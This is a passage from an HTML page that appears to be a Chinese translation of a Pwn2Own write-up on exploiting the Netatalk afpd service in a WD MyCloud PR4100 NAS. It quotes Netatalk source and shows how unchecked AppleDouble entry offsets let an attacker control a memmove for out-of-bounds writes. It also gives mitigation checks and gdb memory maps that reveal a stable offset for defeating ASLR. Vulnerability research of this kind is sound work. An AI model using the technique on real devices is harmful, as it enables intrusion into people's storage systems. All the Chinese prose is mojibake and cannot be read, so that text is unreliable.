        <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">off</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">off</span> <span class="p">));</span>
        <span class="n">off</span> <span class="o">=</span> <span class="n">ntohl</span><span class="p">(</span> <span class="n">off</span> <span class="p">);</span>
        <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">off</span> <span class="p">);</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">len</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">len</span> <span class="p">));</span>
        <span class="n">len</span> <span class="o">=</span> <span class="n">ntohl</span><span class="p">(</span> <span class="n">len</span> <span class="p">);</span>
        <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">len</span> <span class="p">);</span>

        <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_eid</span><span class="p">[</span><span class="n">eid</span><span class="p">].</span><span class="n">ade_off</span> <span class="o">=</span> <span class="n">off</span><span class="p">;</span>
        <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_eid</span><span class="p">[</span><span class="n">eid</span><span class="p">].</span><span class="n">ade_len</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">eid</span>
            <span class="o">||</span> <span class="n">eid</span> <span class="o">&gt;</span> <span class="n">ADEID_MAX</span>
            <span class="o">||</span> <span class="n">off</span> <span class="o">&gt;=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_data</span><span class="p">)</span>
            <span class="o">||</span> <span class="p">((</span><span class="n">eid</span> <span class="o">!=</span> <span class="n">ADEID_RFORK</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">off</span> <span class="o">+</span> <span class="n">len</span> <span class="o">&gt;</span>  <span class="k">sizeof</span><span class="p">(</span><span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_data</span><span class="p">))))</span>
        <span class="p">{</span>
            <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
            <span class="n">LOG</span><span class="p">(</span><span class="n">log_warning</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"parse_entries: bogus eid: %u, off: %u, len: %u"</span><span class="p">,</span>
                <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">eid</span><span class="p">,</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">off</span><span class="p">,</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">len</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>è‡³æ­¤ï¼Œæœ‰å¿…è¦å»äº†è§£è®¾å¤‡å¼€æ”¾äº†å“ªäº›æ¼æ´åˆ©ç”¨çš„ç¼“è§£æªæ–½ï¼Œè¿™æ ·æ‰èƒ½çŸ¥é“æˆ‘ä»¬æ¥ä¸‹æ¥éœ€è¦ç»•è¿‡å“ªäº›é™åˆ¶ï¼ŒåŒæ—¶éœ€è¦åˆ†æ<code class="language-plaintext highlighter-rouge">parse_entries()</code>å‡½æ•°ä¹‹åçš„ä»£ç æ¥äº†è§£æˆ‘ä»¬éœ€è¦æ„å»ºå“ªäº›æ¼æ´åˆ©ç”¨åŸè¯­ã€‚</p><h1 id="åˆ©ç”¨">åˆ©ç”¨</h1><h2 id="ç¯å¢ƒä¸­çš„ç¼“è§£æªæ–½">ç¯å¢ƒä¸­çš„ç¼“è§£æªæ–½</h2><p>æ£€æŸ¥è®¾å¤‡æ“ä½œç³»ç»Ÿçš„å†…æ ¸æ˜¯å¦å¼€æ”¾ASLRï¼š</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>root@MyCloudPR4100 ~ # cat /proc/sys/kernel/randomize_va_space 
2
</pre></table></code></div></div><p>ä»<a href="https://docs.oracle.com/cd/E37670_01/E36387/html/ol_aslr_sec.html">è¿™é‡Œ</a>å¯çŸ¥ï¼š</p><ul><li>0 - ç¦ç”¨ASLRã€‚å½“å†…æ ¸ä»¥norandmapså‚æ•°å¯åŠ¨æ—¶ï¼Œå°†åº”ç”¨è¯¥è®¾ç½®ã€‚<li>1 - éšæœºåŒ–æ ˆåœ°å€ã€VDSOé¡µåœ°å€ä»¥åŠå…±äº«å†…å­˜åŒºåŸŸåœ°å€ã€‚æ•°æ®æ®µçš„åŸºåœ°å€ä½äºå¯æ‰§è¡Œä»£ç æ®µæœ«å°¾ä¹‹åã€‚<li>2 - éšæœºåŒ–æ ˆåœ°å€ã€VDSOé¡µåœ°å€ã€å…±äº«å†…å­˜åŒºåŸŸåœ°å€ä»¥åŠæ•°æ®æ®µåœ°å€ã€‚è¿™æ˜¯é»˜è®¤çš„è®¾ç½®ã€‚</ul><p>ç”¨<a href="https://github.com/Wenzel/checksec.py">checksec.py</a>è„šæœ¬æ£€æŸ¥<code class="language-plaintext highlighter-rouge">afpd</code>äºŒè¿›åˆ¶ç¨‹åºçš„ç¼“è§£æªæ–½ï¼š</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>[*] '/home/cedric/pwn2own/firmware/wd_pr4100/_WDMyCloudPR4100_5.17.107_prod.bin.extracted/squashfs-root/usr/sbin/afpd'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
</pre></table></code></div></div><p>æ€»ç»“ä¸€ä¸‹ï¼š</p><ul><li><code class="language-plaintext highlighter-rouge">afpd</code>ï¼šéšæœºåŒ–<ul><li><code class="language-plaintext highlighter-rouge">.text</code>ï¼šå¯è¯»/å¯æ‰§è¡Œ<li><code class="language-plaintext highlighter-rouge">.data</code>ï¼šå¯è¯»/å¯å†™</ul><li>å…±äº«åº“ï¼šéšæœºåŒ–<li>å †ï¼šéšæœºåŒ–<li>æ ˆï¼šéšæœºåŒ–</ul><p>ç”±äºæ‰€æœ‰ä¸œè¥¿çš„åœ°å€éƒ½è¢«éšæœºåŒ–ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸€äº›ä¿¡æ¯æ³„éœ²çš„åˆ©ç”¨åŸè¯­æ¥ç»•è¿‡ASLRã€‚æˆ‘ä»¬è¿˜éœ€è¦ç ”ç©¶ï¼Œæ˜¯å¦å¯ä»¥è§¦å‘ä¸€æ¡è·¯å¾„ï¼Œä½¿å¾—åç§»è¶Šç•Œè®¿é—®å¯¹æ¼æ´åˆ©ç”¨æœ‰ç”¨ã€‚</p><h2 id="å‘ç°å¥½ç”¨çš„æ¼æ´åˆ©ç”¨åŸè¯­">å‘ç°å¥½ç”¨çš„æ¼æ´åˆ©ç”¨åŸè¯­</h2><p>è®©æˆ‘ä»¬å†æ¥åˆ†æä¸€ä¸‹<code class="language-plaintext highlighter-rouge">ad_header_read_osx()</code>å‡½æ•°ä¸­çš„ä»£ç ã€‚è¿™é‡Œå‡å®šå‰é¢è®¨è®ºè¿‡çš„<code class="language-plaintext highlighter-rouge">parse_entries()</code>å‡½æ•°è§£æäº†ä¸€ä¸ªå­˜åœ¨è¶Šç•Œåç§»entryçš„AppleDoubleæ–‡ä»¶ã€‚æ¥çœ‹çœ‹å†<code class="language-plaintext highlighter-rouge">parse_entries()</code>å‡½æ•°è¿”å›ä¹‹åï¼Œæˆ‘ä»¬è¿˜èƒ½åšäº›ä»€ä¹ˆã€‚å¯ä»¥çœ‹åˆ°ï¼Œå‡å®š<code class="language-plaintext highlighter-rouge">if (ad_getentrylen(&amp;adosx, ADEID_FINDERI) != ADEDLEN_FINDERI) {</code>æ¡ä»¶æˆç«‹ï¼Œè¯¥å‡½æ•°æœ€ç»ˆä¼šè°ƒç”¨å¹¶è¿›å…¥<code class="language-plaintext highlighter-rouge">ad_convert_osx()</code>å‡½æ•°ã€‚</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>    <span class="n">nentries</span> <span class="o">=</span> <span class="n">len</span> <span class="o">/</span> <span class="n">AD_ENTRY_LEN</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">parse_entries</span><span class="p">(</span><span class="o">&amp;</span><span class="n">adosx</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">nentries</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_warning</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"ad_header_read(%s): malformed AppleDouble"</span><span class="p">,</span>
            <span class="n">path</span> <span class="o">?</span> <span class="n">fullpathname</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="o">:</span> <span class="s">""</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">ad_getentrylen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">adosx</span><span class="p">,</span> <span class="n">ADEID_FINDERI</span><span class="p">)</span> <span class="o">!=</span> <span class="n">ADEDLEN_FINDERI</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_warning</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"Convert OS X to Netatalk AppleDouble: %s"</span><span class="p">,</span>
            <span class="n">path</span> <span class="o">?</span> <span class="n">fullpathname</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="o">:</span> <span class="s">""</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">retry_read</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">LOG</span><span class="p">(</span><span class="n">log_error</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"ad_header_read_osx: %s, giving up"</span><span class="p">,</span> <span class="n">path</span> <span class="o">?</span> <span class="n">fullpathname</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="o">:</span> <span class="s">""</span><span class="p">);</span>
            <span class="n">errno</span> <span class="o">=</span> <span class="n">EIO</span><span class="p">;</span>
            <span class="n">EC_FAIL</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">retry_read</span><span class="o">++</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ad_convert_osx</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">adosx</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">goto</span> <span class="n">reread</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">errno</span> <span class="o">=</span> <span class="n">EIO</span><span class="p">;</span>
        <span class="n">EC_FAIL</span><span class="p">;</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>å°±åƒä¸‹é¢ä»£ç çš„æ³¨é‡Šä¸­æ‰€å£°æ˜çš„é‚£æ ·ï¼Œ<code class="language-plaintext highlighter-rouge">ad_convert_osx()</code>å‡½æ•°è´Ÿè´£å°†è‹¹æœAppleDoubleæ–‡ä»¶æ ¼å¼è½¬æ¢ä¸ºNetatalkå®ç°çš„ä¸€ä¸ªæ›´ä¸ºç®€å•çš„æ ¼å¼ã€‚</p><p>å¯ä»¥çœ‹å‡ºï¼Œ<code class="language-plaintext highlighter-rouge">ad_convert_osx()</code>å‡½æ•°ä¸€å¼€å§‹é€šè¿‡æ˜ å°„å°†åŸå§‹çš„forkæ–‡ä»¶ï¼ˆåŸºäºAppleDoubleæ–‡ä»¶æ ¼å¼ï¼‰æ˜ å°„è¿›å†…å­˜å½“ä¸­ã€‚ä¹‹åï¼Œè¯¥å‡½æ•°è°ƒç”¨<code class="language-plaintext highlighter-rouge">memmove()</code>æ¥ä¸¢å¼ƒæ‰FinderInfoéƒ¨åˆ†çš„å†…å®¹ï¼Œå¹¶å°†å‰©ä½™éƒ¨åˆ†è½¬ç§»åˆ°è¯¥éƒ¨åˆ†çš„å¼€å¤´ã€‚</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/libatalk/adouble/ad_open.c</span>
<span class="cm">/**
 * Convert from Apple's ._ file to Netatalk
 *
 * Apple's AppleDouble may contain a FinderInfo entry longer then 32 bytes
 * containing packed xattrs. Netatalk can't deal with that, so we
 * simply discard the packed xattrs.
 *
 * As we call ad_open() which might result in a recursion, just to be sure
 * use static variable in_conversion to check for that.
 *
 * Returns -1 in case an error occured, 0 if no conversion was done, 1 otherwise
 **/</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">ad_convert_osx</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">adouble</span> <span class="o">*</span><span class="n">ad</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">EC_INIT</span><span class="p">;</span>
    <span class="k">static</span> <span class="kt">bool</span> <span class="n">in_conversion</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">map</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">finderlen</span> <span class="o">=</span> <span class="n">ad_getentrylen</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_FINDERI</span><span class="p">);</span>
    <span class="kt">ssize_t</span> <span class="n">origlen</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">in_conversion</span> <span class="o">||</span> <span class="n">finderlen</span> <span class="o">==</span> <span class="n">ADEDLEN_FINDERI</span><span class="p">)</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">in_conversion</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>

    <span class="n">LOG</span><span class="p">(</span><span class="n">log_debug</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"Converting OS X AppleDouble %s, FinderInfo length: %d"</span><span class="p">,</span>
        <span class="n">fullpathname</span><span class="p">(</span><span class="n">path</span><span class="p">),</span> <span class="n">finderlen</span><span class="p">);</span>

    <span class="n">origlen</span> <span class="o">=</span> <span class="n">ad_getentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">)</span> <span class="o">+</span> <span class="n">ad_getentrylen</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">);</span>

    <span class="n">map</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">origlen</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">ad_reso_fileno</span><span class="p">(</span><span class="n">ad</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">map</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_error</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"mmap AppleDouble: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
        <span class="n">EC_FAIL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">memmove</span><span class="p">(</span><span class="n">map</span> <span class="o">+</span> <span class="n">ad_getentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_FINDERI</span><span class="p">)</span> <span class="o">+</span> <span class="n">ADEDLEN_FINDERI</span><span class="p">,</span>
            <span class="n">map</span> <span class="o">+</span> <span class="n">ad_getentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">),</span>
            <span class="n">ad_getentrylen</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">));</span>
</pre></table></code></div></div><p>æ˜¯æ—¶å€™æ¥çœ‹çœ‹<code class="language-plaintext highlighter-rouge">adouble</code>ç»“æ„ä½“äº†ã€‚å¯¹äºæˆ‘ä»¬æ¥è¯´ï¼Œå…¶ä¸­é‡è¦çš„å­—æ®µæ˜¯<code class="language-plaintext highlighter-rouge">ad_eid[]</code>å’Œ<code class="language-plaintext highlighter-rouge">ad_data[]</code>ã€‚å½“AppleDoubleæ–‡ä»¶è¢«è¯»å–çš„æ—¶å€™ï¼Œ<code class="language-plaintext highlighter-rouge">adouble</code>ç»“æ„ä½“å°±è¢«æ±¡æŸ“äº†ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æ§åˆ¶æ‰€æœ‰çš„è¿™äº›å­—æ®µã€‚</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/include/atalk/adouble.h</span>
<span class="k">struct</span> <span class="nc">ad_entry</span> <span class="p">{</span>
    <span class="kt">off_t</span>     <span class="n">ade_off</span><span class="p">;</span>
    <span class="kt">ssize_t</span>   <span class="n">ade_len</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="nc">adouble</span> <span class="p">{</span>
    <span class="kt">uint32_t</span>            <span class="n">ad_magic</span><span class="p">;</span>         <span class="cm">/* Official adouble magic                   */</span>
    <span class="kt">uint32_t</span>            <span class="n">ad_version</span><span class="p">;</span>       <span class="cm">/* Official adouble version number          */</span>
    <span class="kt">char</span>                <span class="n">ad_filler</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
    <span class="k">struct</span> <span class="nc">ad_entry</span>     <span class="n">ad_eid</span><span class="p">[</span><span class="n">ADEID_MAX</span><span class="p">];</span>

    <span class="p">...</span>
    <span class="kt">char</span>                <span class="n">ad_data</span><span class="p">[</span><span class="n">AD_DATASZ_MAX</span><span class="p">];</span>
<span class="p">};</span>
</pre></table></code></div></div><p>ç”¨æ¥è®¿é—®EIDåç§»ã€é•¿åº¦å­—æ®µä»¥åŠæ•°æ®å†…å®¹çš„å‡½æ•°/å®å®šä¹‰å¯ä»¥ä¸€çœ¼çœ‹å‡ºï¼š</p><ul><li><code class="language-plaintext highlighter-rouge">ad_getentryoff()</code>ï¼šè·å–ä¸€ä¸ªEIDåç§»å€¼<li><code class="language-plaintext highlighter-rouge">ad_getentrylen()</code>ï¼šè·å–ä¸€ä¸ªEIDé•¿åº¦å€¼<li><code class="language-plaintext highlighter-rouge">ad_entry()</code>ï¼šè·å–EIDå¯¹åº”çš„æ•°æ®ï¼ˆé€šè¿‡ä¸Šé¢çš„åç§»æ¥è·å–ï¼‰</ul><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/libatalk/adouble/ad_open.c</span>
<span class="kt">off_t</span> <span class="nf">ad_getentryoff</span><span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="nc">adouble</span> <span class="o">*</span><span class="n">ad</span><span class="p">,</span> <span class="kt">int</span> <span class="n">eid</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_vers</span> <span class="o">==</span> <span class="n">AD_VERSION2</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_eid</span><span class="p">[</span><span class="n">eid</span><span class="p">].</span><span class="n">ade_off</span><span class="p">;</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">eid</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="n">ADEID_DFORK</span><span class="p">:</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">ADEID_RFORK</span><span class="p">:</span>
<span class="cp">#ifdef HAVE_EAFD
</span>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="cp">#else
</span>        <span class="k">return</span> <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_eid</span><span class="p">[</span><span class="n">eid</span><span class="p">].</span><span class="n">ade_off</span><span class="p">;</span>
<span class="cp">#endif
</span>    <span class="nl">default:</span>
        <span class="k">return</span> <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_eid</span><span class="p">[</span><span class="n">eid</span><span class="p">].</span><span class="n">ade_off</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="cm">/* deadc0de */</span>
    <span class="n">AFP_PANIC</span><span class="p">(</span><span class="s">"What am I doing here?"</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/include/atalk/adouble.h</span>
<span class="cp">#define ad_getentrylen(ad,eid)     ((ad)-&gt;ad_eid[(eid)].ade_len)
#define ad_setentrylen(ad,eid,len) ((ad)-&gt;ad_eid[(eid)].ade_len = (len))
#define ad_setentryoff(ad,eid,off) ((ad)-&gt;ad_eid[(eid)].ade_off = (off))
#define ad_entry(ad,eid)           ((caddr_t)(ad)-&gt;ad_data + (ad)-&gt;ad_eid[(eid)].ade_off)
</span></pre></table></code></div></div><p>å› æ­¤æˆ‘ä»¬æ§åˆ¶äº†AppleDoubleæ–‡ä»¶çš„æ‰€æœ‰å­—æ®µã€‚æ›´ç¡®åˆ‡åœ°è¯´ï¼Œæˆ‘ä»¬çŸ¥é“æˆ‘ä»¬å¯ä»¥ä¸ºæˆ‘ä»¬éœ€è¦çš„æ‰€æœ‰entryç²¾å¿ƒæ„é€ éæ³•çš„EIDâ€œåç§»â€ï¼Œè¿™ä¸€åˆ‡éƒ½å› ä¸ºä¹‹å‰è®¨è®ºè¿‡çš„<code class="language-plaintext highlighter-rouge">parse_entries()</code>å‡½æ•°çš„è¿”å›å€¼æ²¡æœ‰è¢«æ£€æŸ¥ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ‹¥æœ‰æ›´å¤§çš„æ•°æ®æ¥ç²¾å¿ƒæ„é€ æ‰€éœ€å¤§å°çš„èµ„æºforkæ–‡ä»¶ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æœ‰æ•ˆæ§åˆ¶<code class="language-plaintext highlighter-rouge">memmove()</code>å‡½æ•°çš„æºåœ°å€ã€ç›®çš„åœ°å€ä»¥åŠé•¿åº¦å‚æ•°ï¼Œæ¥å‘å†…å­˜æ˜ å°„ä¹‹å¤–çš„åœ°å€ç©ºé—´å†™å…¥æˆ‘ä»¬æ§åˆ¶çš„æ•°æ®ã€‚</p><p>æ³¨æ„ï¼šæˆ‘ä»¬éœ€è¦çš„entryæ˜¯<code class="language-plaintext highlighter-rouge">ADEID_FINDERI</code>å’Œ<code class="language-plaintext highlighter-rouge">ADEID_RFORK</code>ï¼š</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>    <span class="n">memmove</span><span class="p">(</span><span class="n">map</span> <span class="o">+</span> <span class="n">ad_getentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_FINDERI</span><span class="p">)</span> <span class="o">+</span> <span class="n">ADEDLEN_FINDERI</span><span class="p">,</span>
            <span class="n">map</span> <span class="o">+</span> <span class="n">ad_getentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">),</span>
            <span class="n">ad_getentrylen</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">));</span>
</pre></table></code></div></div><p>ä¸‹ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œå†…å­˜æ˜ å°„çš„åœ°å€è¢«æ˜ å°„åˆ°äº†å“ªé‡Œï¼Ÿ</p><p>é€šè¿‡å®é™…æµ‹è¯•æˆ‘ä»¬å‘ç°ï¼Œå¦‚æœforkæ–‡ä»¶çš„å¤§å°å°äº0x1000å­—èŠ‚ï¼Œæ–‡ä»¶å°†è¢«æ˜ å°„åˆ°<code class="language-plaintext highlighter-rouge">uams_pam.so</code>ï¼Œ<code class="language-plaintext highlighter-rouge">uams_guest.so</code>å’Œ<code class="language-plaintext highlighter-rouge">ld-2.28.so</code>ä¹‹å‰çš„éå¸¸é«˜çš„åœ°å€ä½ç½®ã€‚æ›´ç¡®åˆ‡åœ°è¯´ï¼Œ<code class="language-plaintext highlighter-rouge">ld-2.28.so</code>åœ¨å†…å­˜ä¸­çš„æ˜ å°„èµ·å§‹åœ°å€æ€»æ˜¯åœ¨è¢«æ˜ å°„çš„forkæ–‡ä»¶èµ·å§‹åœ°å€ä¹‹åçš„0xC0000å­—èŠ‚å¤„ï¼Œå³ä½¿ASLRå¼€æ”¾ï¼š</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre><td class="rouge-code"><pre>(gdb) info proc mappings 
process 26343
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x5579bb534000     0x5579bb53d000     0x9000        0x0 /usr/local/modules/usr/sbin/afpd
      0x5579bb53d000     0x5579bb571000    0x34000     0x9000 /usr/local/modules/usr/sbin/afpd
      0x5579bb571000     0x5579bb57c000     0xb000    0x3d000 /usr/local/modules/usr/sbin/afpd
      0x5579bb57c000     0x5579bb57d000     0x1000    0x47000 /usr/local/modules/usr/sbin/afpd
      0x5579bb57d000     0x5579bb580000     0x3000    0x48000 /usr/local/modules/usr/sbin/afpd
      0x5579bb580000     0x5579bb5a0000    0x20000        0x0 
      0x5579bcd51000     0x5579bcd72000    0x21000        0x0 [heap]
      0x5579bcd72000     0x5579bcd92000    0x20000        0x0 [heap]
      0x7f6c56e30000     0x7f6c56eb0000    0x80000        0x0 
      ...
      0x7f6c57e02000     0x7f6c57e24000    0x22000        0x0 /lib/libc-2.28.so
      0x7f6c57e24000     0x7f6c57f6c000   0x148000    0x22000 /lib/libc-2.28.so
      0x7f6c57f6c000     0x7f6c57fb8000    0x4c000   0x16a000 /lib/libc-2.28.so
      0x7f6c57fb8000     0x7f6c57fb9000     0x1000   0x1b6000 /lib/libc-2.28.so
      0x7f6c57fb9000     0x7f6c57fbd000     0x4000   0x1b6000 /lib/libc-2.28.so
      0x7f6c57fbd000     0x7f6c57fbf000     0x2000   0x1ba000 /lib/libc-2.28.so
      ...
      0x7f6c58129000     0x7f6c58134000     0xb000        0x0 /usr/local/modules/lib/libatalk.so.18.0.0
      0x7f6c58134000     0x7f6c58177000    0x43000     0xb000 /usr/local/modules/lib/libatalk.so.18.0.0
      0x7f6c58177000     0x7f6c58191000    0x1a000    0x4e000 /usr/local/modules/lib/libatalk.so.18.0.0
      0x7f6c58191000     0x7f6c58192000     0x1000    0x67000 /usr/local/modules/lib/libatalk.so.18.0.0
      0x7f6c58192000     0x7f6c58194000     0x2000    0x68000 /usr/local/modules/lib/libatalk.so.18.0.0
      0x7f6c58194000     0x7f6c581b1000    0x1d000        0x0 
      0x7f6c581b2000     0x7f6c581b3000     0x1000        0x0 /mnt/HD/HD_a2/Public/edg/._mooncake
      0x7f6c581b3000     0x7f6c581b4000     0x1000        0x0 /usr/local/modules/lib/netatalk/uams_pam.so
      0x7f6c581b4000     0x7f6c581b6000     0x2000     0x1000 /usr/local/modules/lib/netatalk/uams_pam.so
      0x7f6c581b6000     0x7f6c581b7000     0x1000     0x3000 /usr/local/modules/lib/netatalk/uams_pam.so
      0x7f6c581b7000     0x7f6c581b8000     0x1000     0x3000 /usr/local/modules/lib/netatalk/uams_pam.so
      0x7f6c581b8000     0x7f6c581b9000     0x1000     0x4000 /usr/local/modules/lib/netatalk/uams_pam.so
